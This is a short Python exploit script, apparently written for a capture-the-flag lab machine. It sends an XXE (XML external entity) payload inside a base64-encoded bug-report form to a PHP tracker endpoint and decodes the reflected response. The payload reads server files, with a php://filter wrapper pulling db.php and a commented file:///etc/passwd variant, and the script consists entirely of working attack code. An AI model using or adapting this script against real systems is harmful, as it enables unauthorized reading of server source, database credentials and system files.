import re
import sys
import requests as r
import base64

url = "http://10.10.11.100/tracker_diRbPr00f314.php"
payload = "php://filter/convert.base64-encode/resource=db.php"
# payload = "file:///etc/passwd"
# payload = sys.argv[1]

data = f"""<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
    <!ELEMENT foo ANY>
    <!ENTITY xxe SYSTEM "{payload}">
]>
        <bugreport>
        <title>&xxe;</title>
        <cwe>test</cwe>
        <cvss>test</cvss>
        <reward>test</reward>
        </bugreport>""".encode('ascii')

postdata = {"data": base64.b64encode(data).decode('ascii')}
rspn = r.post(url, data=postdata)
# print(rspn.text)

filter_rspn = re.findall('<td>(.*?)</td>', rspn.text, re.DOTALL)[1]
try:
    b64decode = base64.b64decode(filter_rspn).decode()
    print(bytes(b64decode, 'utf-8').decode('unicode_escape'))
except Exception:
    print(filter_rspn)



